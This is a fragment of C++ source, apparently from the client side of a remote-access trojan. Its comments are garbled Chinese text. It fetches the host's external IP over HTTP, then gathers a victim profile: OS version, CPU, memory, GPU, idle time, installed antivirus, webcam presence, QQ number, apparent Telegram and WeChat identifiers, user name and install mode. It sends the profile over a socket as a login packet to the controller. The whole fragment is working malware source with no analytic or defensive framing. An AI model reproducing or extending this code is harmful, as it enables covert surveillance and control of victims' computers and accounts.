		InternetCloseHandle(hHttpFile);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	szHttpBuffer = new char[dwHttpBufferLen+1];
	m_gFunc.memset(szHttpBuffer, 0, dwHttpBufferLen+1);
	if (!InternetReadFile(hHttpFile, szHttpBuffer, dwHttpBufferLen, &dwBytesRead))
	{
		delete[] szHttpBuffer;
		InternetCloseHandle(hHttpFile);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	InternetCloseHandle(hHttpFile);
	InternetCloseHandle(hInternet);
	ip_start = strchr(szHttpBuffer, '\"');
	ip_stop = strrchr(szHttpBuffer, '\"');
	if (ip_start!=NULL && ip_stop!=NULL)
	{
		ip_start++;
		*ip_stop = '\0';
		ULONG Addr = inet_addr(ip_start);
		delete[] szHttpBuffer;
		if (Addr != INADDR_NONE)
		{
			IPAddress->S_un.S_addr = Addr;
			return TRUE;
		}
	}
	delete[] szHttpBuffer;
	return FALSE;
}
/////
//����������Ϣ
void * my_memcpy(void * dst, const void * src, size_t count)
{
	void * ret = dst;
	while (count--) {
		*(char *)dst = *(char *)src;
		dst = (char *)dst + 1;
		src = (char *)src + 1;
	}
	return(ret);
}
int SendLoginInfo(CClientSocket *pClient, DWORD dwSpeed)
{
	// ��¼��Ϣ
	LOGININFO	LoginInfo;
	// ��ʼ��������
	LoginInfo.bToken = TOKEN_LOGIN; // ����Ϊ��¼

	char strSubKey[MAX_PATH];

	m_gFunc.wsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", MyServiceName);

	//����
	m_gFunc.memset(LoginInfo.UpGroup,0,sizeof(LoginInfo.UpGroup));
	ReadRegEx(HKEY_CURRENT_USER, strSubKey,"Group", REG_SZ, LoginInfo.UpGroup, NULL,lstrlen(LoginInfo.UpGroup), 0);
	
	// ���ӵ�IP��ַ
	sockaddr_in  sockAddr;
	m_gFunc.memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	m_gFunc.getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	// ������
	GetHostRemark( LoginInfo.HostName, sizeof(LoginInfo.HostName),strSubKey);

	//������͸
	if (MyFct) GetWanIPAddress(&LoginInfo.IPAddress);
	my_memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	my_memcpy(&LoginInfo.HostName, LoginInfo.HostName, sizeof(LoginInfo.HostName));

	//ϵͳ�汾
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	m_gFunc.GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // ע��ת������
	DWORD dwMajorVer;
	DWORD dwMinorVer;
	DWORD dwBuildNumber;
	if (GetNtVersionNumbers(dwMajorVer,dwMinorVer,dwBuildNumber))
	{
		LoginInfo.dwMajorVer = dwMajorVer;
		LoginInfo.dwMinorVer = dwMinorVer;
		LoginInfo.dwBuildNumber = dwBuildNumber;
	}
	// �ж� �ǲ��� 64λϵͳ
	LoginInfo.bIsWow64=IsWindows64();
	
	// CPU
	CPUClockMhzt(LoginInfo.CPUClockMhz);
	// �ڴ�
    MEMORYSTATUSEX	MemInfo; //��GlobalMemoryStatusEx����ʾ2G�����ڴ�
	MemInfo.dwLength=sizeof(MemInfo); 
	GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
	LoginInfo.dwMemSize = (unsigned long)strMem;
	///////�Կ�///////////////////////////////
/*	if(!ReadRegEx(HKEY_LOCAL_MACHINE, 
		"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", 
		"DriverDesc",
		REG_SZ,
		LoginInfo.szGraphics,
		NULL,lstrlen(LoginInfo.szGraphics),0))strcpy(LoginInfo.szGraphics,"Find GPU Graphics error");*/
	
	LPDIRECTDRAW2 lpdd;
	HRESULT ddrval;
	CoInitialize(NULL);	
	
	ddrval = CoCreateInstance(CLSID_DirectDraw,
		NULL, CLSCTX_ALL, IID_IDirectDraw2, (void**)&lpdd);
	
	
	if(!FAILED(ddrval))
	{
		ddrval = IDirectDraw2_Initialize(lpdd, NULL);
	}
	DDCAPS ddcaps;	
	ddcaps.dwSize = sizeof DDCAPS;
	lpdd->GetCaps(&ddcaps, NULL);
	lpdd->Release();
	DWORD dwMem = ddcaps.dwVidMemTotal;
	int iMem = dwMem/1008/1008;
	LoginInfo.Memory7 = iMem;
	/////////////////
	//�û�
	LoginInfo.bIsActive = false;
	//�Ƿ�
	LASTINPUTINFO lpi;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);//��ȡ�ϴ����������ʱ�䡣
	if ((m_gFunc.GetTickCount()-lpi.dwTime)>1000*60*3)//5����
	{
		//��ǰϵͳ�Ѿ�������1����
        LoginInfo.bIsActive = true;
	}

	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	//ɱ����ʾ
	strcpy( LoginInfo.Virus, GetVirus() );
	LoginInfo.bIsWebCam = EnumDevices(); //û������ͷ

	// ��ȡQq
	lstrcpy(LoginInfo.szQQNum,GetQQ());

	//��װʱ��
	GetInstllTime(LoginInfo.szInstallTime, sizeof(LoginInfo.szInstallTime),strSubKey);
	
	//����TG
	strcpy(LoginInfo.TG, ssddd());
	
	//����΢��
	strcpy(LoginInfo.WX, ssdddd());
	//ͨѶ
	lstrcpy(LoginInfo.szLionPass,ConnetPass);
	//����ģʽ
	if(MyDele_zc == 0)
	{
		strcpy(LoginInfo.Pattern,"��ɫ����");
	}
	else
	{
		if (MyDele_zc == 1)
		{
			strcpy(LoginInfo.Pattern,"ע������");
		}
		if (MyDele_zc == 2)
		{
			strcpy(LoginInfo.Pattern,"��������");
		}
	}
	//�û�Ȩ��
	#define MAX_NAME 256
	char szUserName[MAX_NAME] = {0};  
    unsigned long dwNameLen = sizeof(szUserName);  
    GetUserName(szUserName, &dwNameLen);  
    printf("%s\n", szUserName); 
    strcpy(LoginInfo.Admin,szUserName);

	int nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}

